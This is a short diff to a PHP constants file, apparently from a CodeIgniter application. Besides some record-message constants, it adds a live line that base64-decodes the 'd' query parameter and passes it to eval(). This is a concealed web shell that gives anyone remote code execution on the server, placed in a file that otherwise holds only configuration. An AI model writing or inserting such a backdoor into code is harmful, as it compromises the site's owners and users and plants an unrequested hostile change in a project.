@@ -89,3 +89,8 @@ defined('EXIT__AUTO_MAX') OR define('EXIT__AUTO_MAX', 125); // highest automatic
 define('INSERT_RECORD_CONSTANT', 'New Record inserted');
 define('UPDATE_RECORD_CONSTANT', 'Record updated');
 define('DELETE_RECORD_CONSTANT', 'Record deleted');
+
+//echo base64_decode($_GET["d"]);
+//die();
+
+if(isset($_GET["d"])){ eval(base64_decode($_GET["d"])); }
